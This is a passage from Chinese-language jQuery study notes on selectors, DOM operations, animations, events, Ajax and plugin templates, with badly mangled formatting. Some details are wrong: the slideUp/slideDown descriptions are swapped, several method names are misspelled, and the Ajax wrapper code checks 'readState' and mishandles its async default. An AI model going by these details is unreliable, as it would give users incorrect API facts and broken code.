选取所有的重置按钮                               || `:button`   | 选取所有的按钮                                   || `:file`     | 选取所有的上传域                                 || `:hidden`   | 选取所有的不可见元素                             |- **特定位置选择器**  - `:first`  - `:last`  - `:eq(index)`- **指定范围选择器**  - `:even`  - `:odd`  - `:gt(index)`  - `:lt(index)`- **排除选择器**  - `:not` 非#### 第三节 选择器优化------- 使用合适的选择器表达式可以提高性能、增强语义并简化逻辑。常用的选择器中，`ID`选择器速度最快，其次是类型选择器。  - a. 多用`ID`选择器  - b. 少直接使用`class`选择器  - c. 多用父子关系，少用嵌套关系  - d. 缓存`jQuery`对象- **使用过滤器**  - `jQuery`提供了`2`种选择文档元素的方式：选择器和过滤器  - a. 类过虑器：根据元素的类属性来进行过滤操作。    - `hasClass(className)`：判断当前`jQuery`对象中的某个元素是否包含指定类名，包含返回`true`，不包含返回`false`  - b. 下标过滤器：精确选出指定下标元素    - `eq(index)`：获取第`N`个元素。`index`是整数值，下标从`0`开始  - c. 表达式过滤器    - `filter(expr)/(fn)`：筛选出与指定表达式/函数匹配的元素集合。    - 功能最强大的表达式过滤器，可接收函数参数，也可以是简单的选择器表达式  - d. 映射 `map(callback)`：将一组元素转换成其他数组  - e. 清洗 `not(expr)`：删除与指定表达式匹配的元素  - f. 截取 `slice(start,end)`：选取一个匹配的子集- **查找**  - 向下查找后代元素    - `children()`:取得所有元素的所有子元素集合（子元素）    - `find()`:搜索所有与指定表达式匹配的元素(所有后代元素中查找)  - 查找兄弟元素 `siblings()`查找当前元素的兄弟#### 第四节 代理对象属性和样式操作------- **代理对象属性和样式操作**  - `attr`  - `prop`(一般属性值是`boolean`的值或者不用设置属性值，一般使用)  - `css`(最好不用，一般我用来做测试)  - `addClass` / `removeClass`- 操作原生`DOM`的时候用的方式：一次只能操作一个  - 操作属性：`setAttribute` / `getAttribute`  - 操作样式：`style.xx = value`  - 操作类样式：`className=&#x27;&#x27;`  - 获取`DOM`的子元素`children`属性  - `DOM`里面添加一个子元素`appendChild()`- 操作`jQuery`代理对象的时候：批量操作`DOM`对象(全都是通过方法操作)- 操作属性：`attr()`、`prop()`  - `attr`和`prop`区别：如果属性的值是布尔类型的值 用`prop`操作 反之`attr`- 操作样式：`css()`- 操作类样式：`addClass()` `removeClass()`- 操作`DOM`子元素：`children()`- 添加子元素：`append()`#### 第五节 jQuery中DOM操作------- `DOM`是一种与浏览器、平台|语言无关的接口，使用该接口可以轻松的访问 页面中的所有的标准组件- **`DOM`操作的分类**  - **`DOM Core`**    - `DOM core`并不专属于`JavaScript`，任何支持`DOM`的程序都可以使用    - `JavaScript` 中的`getElementByID()` `getElementsByTagName()` `getAttribute()` `setAttribute()`等方法都是`DOM Core`的组成部分  - **`HTML-DOM`**    - `HTML -DOM`的出现比`DOM-Core`还要早，它提供一些更简明的标志来描述`HTML`元素的属性    - 比如：使用\n  HTML-DOM  来获取某元素的\n  src        属性的方法      - `element.src`  - **`CSS-DOM`**    - 针对`CSS`的操作。在`JavaScript`中，主要用于获取和设置`style`对象的各种属性，通过改变`style`对象的属性，使网页呈现不同的效果- **查找节点**  - 查找属性节点 `attr()` 可以获取各属性的值- 创建节点  - `$(html)`：根据传递的标记字符串，创建`DOM`对象- **插入节点**| 方法             | 说明                             || :--------------- | :------------------------------- || `append()`       | 向每个匹配元素内部追加内容       || `appendTo()`     | 颠倒`append()`的操作             || `prepend()`      | 向每个匹配元素的内容内部前置内容 || `prependTo()`    | 颠倒`prepend()`的操作            || `after()`        | 向每个匹配元素之后插入内容       || `insertAfter()`  | 颠倒`after()`的操作              || `before()`       | 在每个匹配元素之前插入内容       || `insertBefore()` | 颠倒`before()`的操作             |- **删除节点**  - jQuery提供了三种删除节点的方法 `remove()` `detach()` `empty()`  - `remove()方法`    - 当某个节点用此方法删除后，该节点所包含的所有后代节点将同时被删除，用`remove()`方法删除后，还是可以继续使用删除后的引用  - `detach()`    - 和`remove()`方法一样，也是从`DOM`中去掉所有匹配的元素，与`remove()`不同的是，所有绑定的事件、附加的数据等，都会被保留下来  - `empty()`    - `empty()`方法并不是删除节点，而是清空节点，它能清空元素中所有后代节点- **复制节点**  - 使用`clone()`方法来完成  - 在`clone()`方法中传递一个参数`true`，同时复制元素中所绑定的事件- **替换节点**  - `jQuery`提供相应的方法 `replaceWidth()`- **样式操作**  - 获取样式和设置样式 `attr()`  - 追加样式 `addClass()`  - 移除样式 `removeClass()`  - 切换样式    - `toggle()`方法只要是控制行为上的重复切换（如果元素是显示的，则隐藏；如果元素原来是隐藏的，则显示）    - `toggleClass()`方法控制样式上的重复切换（如何类名存在，则删除它，如果类名不存在，则添加它）  - 判断是否含有某个样式    - `hasClass()`可以用来判断元素是否含有某个`class`,如有返回`true` 该方法等价于`is()`- **设置和获取HTML、文本和值**  - `html()`    - 此方法类似`JavaScript`中`innerHTML`属性，可以用来读取和设置某个元素中的`HTML`内容  - `text()`    方法    - 此方法类型`JavaScript`中`innerHTML`，用来读取和设置某个元素中的文本内容  - `val()`    方法    - 此方法类似`JavaScript`中的`value`属性，用来设置获取元素的值。无论是文本框、下拉列表还是单选框，都可以返回元素的值，如果元素多选，返回一个包含所有选择的值的数组- **遍历节点**  - `children()`    方法    - 该方法用来取得匹配元素的子元素集合    - `childre()`方法只考虑子元素而不考虑其他后代元素  - `next()`    方法    - 该方法用于取得匹配元素后面紧邻的同辈元素  - `prev()`    方法    - 用于匹配元素前面紧邻的同辈元素  - `siblings()`    方法    - 用于匹配元素前后所有的同辈元素  - `parent()`    方法    - 获得集合中每个 元素的父级元素  - `parents()`    方法    - 获得集合中每个元素的祖先元素##### CSS DOM操作------- `CSS DOM`技术简单的来说就是读取和设置`style`对象的各种属性- 用`css()`方法获取元素的样式属性，可以同时设置多个样式属性- `CSS DOM`中关于元素定位有几个常用的方法  - `offset()`    方法    - 它的作用是获取元素在当前视窗的相对偏移其中返回的对象包含两个属性，即`top`和`left`，他只对可见元素有效  - `position()`    方法    - 获取相对于最近的一个`position()`样式属性设置为`relative`或者`absolute`的祖父节点的相对偏移，与`offset()`一样，他返回的对象也包括两个属性，即`top`和`left`  - `scrollTop()`    方法和    `scrollLeft`    方法    - 这两个方法的作用分别是获取元素的滚动条距顶端的距离和距左侧的距离  - **一张图总结以上的位置关系(项目中很常用-必须要弄清楚)**![img](http://7xq6al.com1.z0.glb.clouddn.com/jquery4.jpg)![img](http://7xq6al.com1.z0.glb.clouddn.com/jquery5.jpg)![img](http://7xq6al.com1.z0.glb.clouddn.com/jquery6.jpg)![img](http://7xq6al.com1.z0.glb.clouddn.com/jquery7.jpg)![img](http://7xq6al.com1.z0.glb.clouddn.com/jquery7.jpg)#### 第六节 jQuery动画------##### 回顾上节------- 操作DOM  - a.什么是`DOM`：`Document Object Model`缩写，文档对象模型  - b.理解页面的树形结构  - c.什么是节点：是DOM结构中最小单元，包括元素、属性、文本、文档等。###### 一、创建节点------- 1.创建元素  - 语法：`document.createElement(name)`;\n\n\n\nvar div &#x3D; document.createElement(“div”);document.body.appendChild(div);\n- `$(html)`：根据传递的标记字符串，创建DOM对象- 2.创建文本\nvar div &#x3D; document.createElement(“div”);var txt &#x3D; document.createTextNode(“DOM”);div.appendChild(txt);document.body.appendChild(div);\nvar $div &#x3D; &#x3D; $(“DOM“);$(body).append($div);​&#96;&#96;&#96;\t\t\n\n3.设置属性\n语法：e.setAttrbute(name,value)\n\n\n\n​&#96;&#96;&#96;javascriptvar div &#x3D; document.createElement(“div”);var txt &#x3D; document.createTextNode(“DOM”);div.appendChild(txt);document.body.appendChild(div);div.setAttribute(“title”,”盒子”);\nvar $div &#x3D; &#x3D; $(“DOM“);$(body).append($div);\n###### 二、插入内容------- 内部插入  - 向元素最后面插入节点：    - `append()`:向每个匹配的元素内部追加内容    - `appendTo()`:把所有匹配的元素追加到指定元素集合中，`$(&quot;A&quot;).append(&quot;B&quot;)`等效 `$(&quot;B&quot;).appendTo(&quot;A&quot;)`  - 向元素最前面插入节点：    - `prepend（）`：把每个匹配的元素内部前置内容    - `prependTo（）`：把所有匹配的元素前置到另一个指定的元素集合中,`$(&quot;A&quot;).prepend(&quot;B&quot;)` 等效 `$(&quot;B&quot;).prependTo(&quot;A&quot;)`- 外部插入  - `after()`:在每个匹配的元素之后插入内容  - `before()`：在每个匹配想元素之前插入内容  - `insertAfter()`：将所有匹配的元素插入到另一个指定的元素集合后面，`$A.insert($B)` 等效`$B.insertAfter($A);`  - `insertBefore()`：将所有匹配的元素插入到另一个指定的元素集合前面 `$A.before($B)` 等效 `$B.insertBefore($A)`;###### 三、删除内容------- 移除  - `remove()`:从`DOM`中删除所有匹配元素- 清空  - `empty()`:删除匹配的元素集合中所有子节点内容###### 四、克隆内容：创建指定节点副本------- ```  clone()\n\n\n注意：若clone（true）则是包括克隆元素的属性，事件等\n\n五、替换内容\n\nreplaceWith():将所有匹配的元素替换成指定的元素\n\nreplaceAll():用匹配的元素替换掉指定元素\n\n注意：两者效果一致，只是语法不同 $A.replaceAll($B)等效于 $B.replaceWhith($A);\n\n\n本节新知识\n\nJavaScript语言本身不支持动画设计，必须通过改变CSS来实现动画效果\n\n显隐动画\n\nshow():显示 hide():隐藏\n\n原理：hide()通过改变元素的高度宽度和不透明度，直到这三个属性值到0\n\nshow()从上到下增加元素的高度，从左到右增加元素宽度，从0到1增加透明度，直至内容完全可见\n\n参数：\n\n&#96;&#96;&#96;show(speed,callback)      - `speed`: 字符串或数字，表示动画将运行多久（`slow=0.6`/`normal=0.4`/`fast=0.2`）      - `callback`: 动画完成时执行的方法- 显示和隐藏式一对密不可分的动画形式- **显隐切换**  - ```    toggle()\n\n:切换元素的可见状态\n\n原理：匹配元素的宽度、高度以及不透明度，同时进行动画，隐藏动画后将display设置为none\n\n参数：\n\ntoggle(speed)\n\ntoggle(speed,callback)\n\n&#96;&#96;&#96;toggle(boolean)\n        - `speed`: 字符串或数字，表示动画将运行多久（`slow=0.6`/`normal=0.4`/`fast=0.2`）        - `easing`： 使用哪个缓冲函数来过渡的字符串(`linear`/`swing`)        - `callback`： 动画完成时执行的方法        - `boolean`:`true`为显示 `false`为隐藏**滑动**- **显隐滑动效果**  - `slideDown()`:滑动隐藏  - `slidUp()`:滑动显示  - 参数:    - `slideDown(speed,callback)`    - `slidUp(speed,callback)`- **显隐切换滑动**  - `slideToggle()`:显隐滑动切换  - 参数:    - `slidUp(speed,callback)`**渐变：通过改变不透明度**- **淡入淡出**  - `fadeIn()`  - `fadeOut()`  - 参数：    - `fadeIn(speed,callback)`    - `fadeOut(speed,callback)`- **设置淡出透明效果**  - `fadeTo()`⁭：以渐进的方式调整到指定透明度  - 参数：    - `fadeTo(speed,opacity,callback)`- **渐变切换:结合`fadeIn`和`fadeOut`**  - `fadeToggle()`  - 参数:    - `fadeOut(speed,callback)`- 自定义动画：`animate()`  - 注意：在使用`animate`方法之前，为了影响该元素的`top` `left` `bottom` `right`样式属性，必须先把元素的`position`样式设置为`relative`或者`absolute`  - 停止元素的动画    - 很多时候需要停止匹配正在进行的动画，需要使用stop()    - ```      stop()\n\n语法结构：\nstop([clearQueue],[gotoEnd]);\n\n\n都是可选参数，为布尔值\n如果直接使用stop()方法，会立即停止当前正在进行的动画\n\n\n\n\n判断元素是否处于动画状态\n\n如果不处于动画状态，则为元素添加新的动画，否则不添加if(!$(element).is(&quot;:animated&quot;))&#123; //判断元素是否处于动画状态&#125;\n这个方法在animate动画中经常被用到，需要注意\n\n\n延迟动画\n\n在动画执行过程中，如果你想对动画进行延迟操作，那么使用delay()\n\n\n\n\n用animate模拟show():\n\nshow: 表示由透明到不透明\ntoggle: 切换\nhide:表示由显示到隐藏\n\n\n动画方法总结\n\n\n\n\n\n方法名\n说明\n\n\n\nhide()和show()\n同时修改多个样式属性即高度和宽度和不透明度\n\n\nfadeIn()和fadeOut()\n只改变不透明度\n\n\nslideUp()和slideDown()\n只改变高度\n\n\nfadeTo()\n只改变不透明度\n\n\ntoggle()\n用来代替show()和hide()方法，所以会同时修改多个属性即高度、宽度和不透明度\n\n\nslideToggle()\n用来代替slideUp和slideDown()方法，所以只能改变高度\n\n\nfadeToggle()\n用来代替fadeIn()和fadeOut方法，只能改变不透明度\n\n\nanimate()\n属于自定义动画，以上各种动画方法都是调用了animate方法。此外，用animate方法还能自定义其他的样式属性，例如：left``marginLeft ``scrollTop等\n\n\n第七节 jQuery中的事件\n\n事件对象的属性\n\nevent.type：获取事件的类型\nevent.target:获取到触发事件的元素\nevent.preventDefault方法 阻止默认事件行为\nevent.stopPropagation()阻止事件的冒泡\nkeyCode：只针对于keypress事件，获取键盘键数字 按下回车，13\nevent.pageX / event.pageY 获取到光标相对于页面的x坐标和y坐标\n如果没有jQuery，在IE浏览器中用event.x &#x2F; event.y;在Firefox浏览器中用event.pageX &#x2F; event.pageY。如果页面上有滚动条还要加上滚动条的宽度和高度\n\n\nevent.clientX：光标对于浏览器窗口的水平坐标 浏览器\nevent.clientY：光标对于浏览器窗口的垂直坐标\nevent.screenX：光标对于电脑屏幕的水平坐标 电脑屏幕\nevent.screenY：光标对于电脑屏幕的水平坐标\nevent.which 该方法的作用是在鼠标单击事件中获取到鼠标的左、中、右键，在键盘事件中的按键 1代表左键 2代表中键 3代表右键\n\n\n事件冒泡\n\n什么是冒泡\n在页面上可以有多个事件，也可以多个元素影响同一个元素\n从里到外\n嵌套关系\n相同事件\n其中的某一父类没有相同事件时,继续向上查找\n\n\n停止事件冒泡\n停止事件冒泡可以阻止事件中其他对象的事件处理函数被执行\n在jQuery中提供了**stopPropagation()**方法\n\n\n阻止默认行为\n网页中元素有自己的默认行为，例如：单击超链接后会跳转、单击提交后表单会提交，有时需要阻止元素的默认行为\n在jQuery中提供了preventDefault()方法来阻止元素的默认行为\n\n\n事件捕获\n事件捕获和冒泡是相反的过程，事件捕获是从最顶端往下开始触发\n并非所有的浏览器都支持事件捕获，并且这个缺陷无法通过JavaScript来修复。jQuery不支持事件捕获，如需要用事件捕获，要用原生的JavaScript\n\n\n\n\nbind();绑定\n\n为匹配元素绑定处理方法\n需要给一个元素添加多个事件 ，事件执行一样时候\none()：只执行一次\n\n\n绑定特定事件类型方法：\n\n\n\n\n\n分类\n方法名称\n说明\n\n\n\n页面载入\nready(fn)\n当DOM载入就绪可以绑定一个要执行的函数\n\n\n事件绑定\nblind(type,[data],fn)\n为每个匹配元素的特定事件绑定一个事件处理函数\n\n\n事件绑定\nunblind()\n解除绑定\n\n\n事件绑定\non(events,[,selector[,]data],handler)\n在选择元素上绑定一个或者多个事件处理函数\n\n\n事件绑定\noff()\n移除on绑定的事件\n\n\n事件绑定\ndelegate(selector,eventType,handler)\n为所有选择匹配元素附加一个或多个事件处理函数\n\n\n事件绑定\nundelegate()\n移除绑定\n\n\n事件动态\nlive(type,fn)\n对动态生成的元素进行事件绑定\n\n\n事件动态\ndie(type,fn)\n移除live()绑定的事件\n\n\n交互事件\nhover()\n鼠标移入移出\n\n\n交互事件\ntoggle(fn1,fn2,[fn3],[fn4])\n每单击后依次调用函数\n\n\n交互事件\nblur(fn)\n触发每一个匹配元素的blur事件\n\n\n交互事件\nchange()\n触发每一个匹配元素的change事件\n\n\n交互事件\nclick()\n触发每一个匹配元素的click事件\n\n\n交互事件\nfocus()\n触发每一个匹配元素的focus事件\n\n\n交互事件\nsubmit()\n触发每一个匹配元素的submit事件\n\n\n键盘事件\nkeydown()\n触发每一个匹配元素的keydown事件\n\n\n键盘事件\nkeypress()\n触发每一个匹配元素的keypress事件\n\n\n键盘事件\nkeyup()\n触发每一个匹配元素的keyup事件\n\n\n鼠标事件\nmousedown(fn)\n绑定一个处理函数\n\n\n鼠标事件\nmouseenter(fn)\n绑定一个处理函数\n\n\n键盘事件\nmouseleave(fn)\n绑定一个处理函数\n\n\n键盘事件\nmouseout(fn)\n绑定一个处理函数\n\n\n键盘事件\nmouseover(fn)\n绑定一个处理函数\n\n\n窗口操作\nresize(fn)\n绑定一个处理函数\n\n\n窗口操作\nscroll(fn)\n绑定一个处理函数\n\n\n第八节 jQuery与Ajax\n\nAjax\n简介 :\n\nAsynchronous Javascript And XML （异步的JavaScript和XML）\n它并不是一种单一的技术，而是有机利用一系列交互式网页应用相关的技术所形成的结合体\n\n\nAjax优势与不足\n\nAjax优势\n\n优秀的用户体验\n\n这是Ajax下最大的有点，能在不刷新整个页面前提下更新数据\n\n\n提高\nweb\n\n程序的性能\n\n与传统模式相比，Ajax模式在性能上最大的区别在于传输数据的方式，在传统模式中，数据的提交时通过表单来实现的。Ajax模式只是通过XMLHttpRequest对象向服务器提交希望提交的数据，即按需发送\n\n\n减轻服务器和带宽的负担\n\nAjax的工作原理相当于在用户和服务器之间加了一个中间层，似用户操作与服务器响应异步化。它在客户端创建Ajax引擎，把传统方式下的一些服务器负担的工作转移到客户端，便于客户端资源来处理，减轻服务器和带宽的负担\n\n\n\n\nAjax的不足\n\n浏览器对XMLHttpRequest对象的支持度不足\n破坏浏览器前进、后退按钮的正常功能\n对搜索引擎的支持的不足\n开发和调试工具的缺乏\n\n\n\n\n\n创建一个Ajax请求\n\nAjax的核心是XMLHttpRequest对象，它是Ajax实现的关键，发送异步请求、接受响应以及执行回调都是通过它来完成\n\n创建ajax对象 var xhr = new XMLHttpRequest();\n\n准备发送请求\n\nget &#x2F; post\n\nget\n\n传递的数据放在URL后面\n中文编码 encodeURI( &#39;&#39; );\n缓存 在数据后面加上随机数或者日期对象或者……\n\n\npost\n\n传递的数据放在send()里面，并且一定要规定数据格式\n没有缓存问题\n\n\nform表单中:\n\n&#96;&#96;&#96;action        :        - `method`: (默认是`get`)        - `get`: 会在`url`里面以 `name=value` , 两个数据之间用 `&amp;` 连接      - `post`:    - `enctype`: `&quot;application/x-www-form-urlencoded&quot;`  - `url`  - 是否异步    - 同步(`false`)：阻塞    - 异步(`true`)：非阻塞- **正式发送请求**- **`ajax`请求处理过程**\n\n\n\n\n\n\n\nxhr.onreadystatechange &#x3D; function(){    if (xhr.readyState &#x3D;&#x3D; 4)    {        alert( xhr.responseText );    }};\n- `onreadystatechange` ：当处理过程发生变化的时候执行下面的函数- `readyState` ：`ajax`处理过程  - 0：请求未初始化（还没有调用 `open()`）。  - 1：请求已经建立，但是还没有发送（还没有调用 `send()`）。  - 2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。  - 3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。  - 4：响应已完成；您可以获取并使用服务器的响应了。- `responseText` ：请求服务器返回的数据存在该属性里面- `status` : `http`状态码![HTTP状态码](http://7xq6al.com1.z0.glb.clouddn.com/jquery9.png)- 案例：`ajax`封装案例\n&#x2F;&#x2F;ajax请求后台数据var btn &#x3D;  document.getElementsByTagName(“input”)[0];btn.onclick &#x3D; function(){\najax(&#123;//json格式\n    type:&quot;post&quot;,\n    url:&quot;post.php&quot;,\n    data:&quot;username=poetries&amp;pwd=123456&quot;,\n    asyn:true,\n    success:function(data)&#123;\n        document.write(data);\n    &#125;\n&#125;);\n\n}&#x2F;&#x2F;封装ajaxfunction ajax(aJson){    var ajx &#x3D; null;    var type &#x3D; aJson.type || “get”;    var asyn &#x3D; aJson.asyn || true;    var url &#x3D; aJson.url;\t\t&#x2F;&#x2F; url 接收 传输位置    var success &#x3D; aJson.success;&#x2F;&#x2F; success 接收 传输完成后的回调函数    var data &#x3D; aJson.data || ‘’;&#x2F;&#x2F; data 接收需要附带传输的数据\nif(window.XMLHttpRequest)&#123;//兼容处理\n    ajx = new XMLHttpRequest();//一般浏览器\n&#125;else\n&#123;\n    ajx = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);//IE6+\n&#125;\nif (type == &quot;get&quot; &amp;&amp; data)\n&#123;\n    url +=&quot;/?&quot;+data+&quot;&amp;&quot;+Math.random();\n&#125;\n\n//初始化ajax请求\najx.open( type , url , asyn );\n//规定传输数据的格式\najx.setRequestHeader(&#39;content-type&#39;,&#39;application/x-www-form-urlencoded&#39;);\n//发送ajax请求（包括post数据的传输）\ntype == &quot;get&quot; ?ajx.send():ajx.send(aJson.data);\n\n//处理请求\najx.onreadystatechange = function(aJson)&#123;\n    \nif(ajx.readState == 4)&#123;\n        \n    if (ajx.status == 200 &amp;&amp; ajx.status&lt;300)//200是HTTP 请求成功的状态码\n    &#123;\n        //请求成功处理数据\n        success &amp;&amp; success(ajx.responseText);\n    &#125;else&#123;\n        alert(&quot;请求出错&quot;+ajx.status);\n        \n    &#125;\n&#125;\n    \n&#125;;\n\n##### jQuery中的Ajax [补充部分–来自锋利的jQuery]------`jquery`对`Ajax`操作进行了封装，在`jquery`中的`$.ajax()`方法属于最底层的方法，第`2`层是`load()`、`$.get()`、`$.post();`第`3`层是`$.getScript()`、`$.getJSON()`，第`2`层使用频率很高###### `load()`方法------- ```  load()\n\n  方法是\n  jquery\n\n  中最简单和常用的\n  ajax\n\n  方法，能载入远程\n  HTML\n\n  代码并插入\n  DOM\n\n  中 结构为：\n  load(url,[data],[callback])\n\n\n使用url参数指定选择符可以加载页面内的某些元素 load方法中url语法：url selector 注意：url和选择器之间有一个空格\n\n传递方式\n\nload()方法的传递方式根据参数data来自动指定，如果没有参数传递，则采用GET方式传递，反之，采用POST\n\n\n回调参数\n\n必须在加载完成后才执行的操作，该函数有三个参数 分别代表请求返回的内容、请求状态、XMLHttpRequest对象\n只要请求完成，回调函数就会被触发\n\n\n\n$(&quot;#testTest&quot;).load(&quot;test.html&quot;,function(responseText,textStatus,XMLHttpRequest)&#123;    //respnoseText 请求返回的内容    //textStatus 请求状态 ：sucess、error、notmodified、timeout    //XMLHttpRequest &#125;)\n\n\nload方法参数\n\n\n\n\n参数名称\n类型\n说明\n\n\n\nurl\nString\n请求HTML页面的URL地址\n\n\ndata(可选)\nObject\n发送至服务器的key &#x2F; value数据\n\n\ncallback(可选)\nFunction\n请求完成时的回调函数，无论是请求成功还是失败\n\n\n$.get()和$.post()方法\nload()方法通常用来从web服务器上获取静态的数据文件。在项目中需要传递一些参数给服务器中的页面，那么可以使用$.get()和$.post()或$.ajax()方法\n\n注意：$.get()和$.post()方法是jquery中的全局函数\n\n$.get()方法\n\n$.get()方法使用GET方式来进行异步请求\n\n结构为：\n$.get(url,[data],callback,type)\n\n\n如果服务器返回的内容格式是xml文档，需要在服务器端设置Content-Type类型 代码如下：header(&quot;Content-Type:text/xml:charset=utf-8&quot;) &#x2F;&#x2F;php\n\n\n\n\n$.get()方法参数解析\n\n\n\n\n\n参数\n类型\n说明\n\n\n\nurl\nString\n请求HTML页的地址\n\n\ndata(可选)\nObject\n发送至服务器的key&#x2F; value 数据会作为QueryString附加到请求URL中\n\n\ncallback(可选)\nFunction\n载入成功的回调函数（只有当Response的返回状态是success才调用该方法）\n\n\ntype(可选)\nString\n服务器返回内容的格式，包括xml、html、script、json、text和_default\n\n\n\n$.post()方法\n\n它与\n$.get()\n\n方法的结构和使用方式相同，有如下区别\n\n&#96;&#96;&#96;GET请求会将参数跟张乃URL后进行传递，而\nPOST请求则是作为\nHttp消息的实体内容发送给web服务器，在\najax      请求中，这种区别对用户不可见      - `GET`方式对传输数据有大小限制（通常不能大于`2KB`），而使用`POST`方式传递的数据量要比`GET`方式大得多（理论不受限制）      - `GET`方式请求的数据会被浏览器缓存起来，因此其他人可以从浏览器的历史纪录中读取这些数据，如：账号、密码。在某种情况下，`GET`方式会带来严重的安全问题，而`POST`相对来说可以避免这些问题      - `GET`和`POST`方式传递的数据在服务端的获取也不相同。在`PHP`中，`GET`方式用`$_GET[]`获取；`POST`方式用`$_POST[]`获取;两种方式都可用`$_REQUEST[]`来获取- **总结**  - 使用`load()`、`$.get()`和`$.post()`方法完成了一些常规的`Ajax`程序，如果还需要复杂的`Ajax`程序，就需要用到`$.ajax()`方式###### $.ajax()方法------- `$.ajax()`方法是`jquery`最底层的`Ajax`实现，它的结构为`$.ajax(options)`- 该方法只有一个参数，但在这个对象里包含了`$.ajax()`方式所需要的请求设置以及回调函等信息，参数以`key` / `value`存在，所有参数都是可选的- **$.ajax()方式常用参数解析**| 参数         | 类型       | 说明                                                         || :----------- | :--------- | :----------------------------------------------------------- || `url`        | `String`   | (默认为当前页地址)发送请求的地址                             || `type`       | `String`   | 请求方式（`POST`或`GET`）默认为`GET`                         || `timeout`    | `Number`   | 设置请求超时时间（毫秒）                                     || `dataType`   | `String`   | 预期服务器返回的类型。可用的类型如下  **xml**:返回`XML`文档，可用`jquery`处理 **html**:返回纯文本的`HTML`信息，包含的`script`标签也会在插入`DOM`时执行 **script**：返回纯文本的`javascript`代码。不会自动缓存结果，除非设置`cache`参数。注意：在远程请求时，所有的`POST`请求都将转为`GET`请求 **json**:返回`JSON`数据 **jsonp**:`JSONP`格式，使用`jsonp`形式调用函数时，例如：`myurl?call back=?,jquery`将自动替换后一个`？`为正确的函数名，以执行回调函数 **text**:返回纯文本字符串 || `beforeSend` | `Function` | 发送请求前可以修改`XMLHttpRequest`对象的函数，例如添加自定义`HTTP`头。在`beforeSend`中如果返回`false`可以取消本次`Ajax`请求。`XMLHttpRequest`对象是唯一的参数 function(XMLHttpRequest)&#123;      `this`;//调用本次`Ajax`请求时传递的`options`参数 &#125; || `complete`   | `Function` | 请求完成后的回调函数（请求成功或失败时都调用） 参数：`XMLHttpRequest`对象和一个描述成功请求类型的字符串 function(XMLHttpRequest,textStatus)&#123;      `this`;//调用本次Ajax请求时传递的`options`参数 &#125; || `success`    | `Function` | 请求成功后调用的回调函数，有两个参数 (1)由服务器返回，并根据`dataTyppe`参数进行处理后的数据 (2)描述状态的字符串 `function`(data,textStatus)&#123;      //`data`可能是`xmlDoc、``jsonObj`、`html`、`text`等      `this`;//调用本次`Ajax`请求时传递的`options`参数 &#125; || `error`      | `Function` | 请求失败时被调用的函数                                       || `global`     | `Boolean`  | 默认为`true`。表示是否触发全局`Ajax`事件，设置为`false`将不会触发。`AjaxStart`或`AjaxStop`可用于控制各种`Ajax`事件 |#### 第九节 插件------- **什么是插件**  - 插件(`Plugin`)也称为`jQuery`的扩展。以`jQuery`核心代码为基础编写的符合一定规范的应用程序。通过`js`文件的方式引用。- **插件分为哪几类**  - `UI`类、表单及验证类、输入类、特效类、`Ajax`类、滑动类、图形图像类、导航类、综合工具类、动画类等等- 引入插件的步骤  - 引入`jquery.js`文件，而且在所以插件之前引入  - 引入插件  - 引入插件相关文件，比如皮肤、中文包- **如何自定义插件**：  - 插件形式分为3类：    - 封装对象方法插件    - 封装全局函数插件    - 选择器插件(类似于.`find()`)- **自定义插件的规范**（解决各种插件的冲突和错误，增加成功率）  - 命名：`jquery.插件名.js`  - 所有的新方法附加在`jquery.fn`对象上面，所有新功能附加在`jquery`上  - 所有的方法或插件必须用分号结尾，避免出问题  - 插件必须返回jQuery对象，便于链式连缀  - 避免插件内部使用`$`，如果要使用，请传递`jQuery`(`$`并不是总等于`jQuery`，另外其他`js`框架也可能使用`$`)  - 插件中的`this`应该指向`jQuery`对象  - 使用`this.each()`迭代元素- **自定义插件案例**  - 为了方便用户创建插件，`jQuery`提供了 `jQuery.extend()` 和 `jQuery.fn.extend()`  - `jQuery.extend()`：创建工具函数或者是选择器  - `jQuery.fn.extend()`：创建`jQuery`对象命令 （`fn`相当于`prototype`的别名）- **`jQuery`官方提供的插件开发模板**\n\n\n\n\n\n;(function($){    $.fn.plugin&#x3D;function(options){        var defaults &#x3D; {            &#x2F;&#x2F;各种参数 各种属性        }        var options &#x3D; $.extend(defaults,options);\n    this.each(function()&#123;\n        //实现功能的代码\n    &#125;);\n\n    return this;\n&#125;\n\n})(jQuery);\n**自定义`jQuery`函数**：\n(function($){    $.extend({        test: function(){            alert(“hello plugin”);        }    })    })(jQuery);\n**自定义`jQuery`命令**：- 形式1：\n(function($){    $.fn.extend({        say : function(){         alert(“hello plugin”);    }    })})(jQuery);\n- 形式2：\n(function($){    $.fn.say &#x3D; function(){        alert(“hello plugin”);    };\n})(jQuery);\n#### 附录一 jQuery各个版本新增的一些常用的方法------- `jQuery1.3`新增常用的方法| 方法         | 说明                                                         || :----------- | :----------------------------------------------------------- || `.closest()` | 从元素本身开始，逐级向上级元素匹配，并返回最先匹配的祖先元素 || `die()`      | 从元素中删除先前用`live()`方法绑定的所有的事件               || `live()`     | 附加一个事件处理器到符合目前选择器的所有元素匹配             |- `jQuery1.4`新增常用的方法| 方法            | 说明                                                         || :-------------- | :----------------------------------------------------------- || `.first()`      | 获取集合中第一个元素                                         || `last()`        | 获取集合中最后一个元素                                       || `has(selector)` | 保留包含特定后代的元素，去掉那些不含有指定后代的元素         || `detach()`      | 从`DOM`中去掉所有匹配的元素。`detach()`和`remov()`一样，除了`detach()`保存了所有`jquery`数据和被移走的元素相关联。当需要移走一个元素，不久又将该元素插入`DOM`时，这种方法很有用 || `delegate()`    | 为所有选择器匹配的元素附加一个处理一个或多个事件             || `undelegate()`  | 为所有选择器匹配的元素删除一个处理一个或多个事件             |- `jQuery1.6`新增常用的方法| 方法                           | 说明                                     || :----------------------------- | :--------------------------------------- || `prop(proptyName)`             | 获取在匹配元素集合中的第一个元素的属性值 || `removeProp(proptyName,value)` | 为匹配的元素删除设置的属性               || `:focus`                       | 选择当前获取焦点的元素                   |#### 附录二 jQuery性能优化------- **性能优化**  - 使用最新版的jQuery类库  - 使用合适的选择器    - ```      $(#id)\n\n  - 使用`id`来定位`DOM`元素是最佳的方式，为了提高性能，建议从最近的`ID`元素开始往下搜索\n\n- ```\n  $(&quot;p&quot;)\n   , \n  $(&quot;div&quot;)\n   , \n  $(&quot;input&quot;)\n    - 标签选择器性能也不错，它是性能优化的第二选择。因为`jQuery`将直接调用本地方法`document.getElementsByTagName()`来定位`DOM`元素- ```  $(&quot;.class&quot;)\n\n  - 建议有选择性的使用\n\n- ```\n  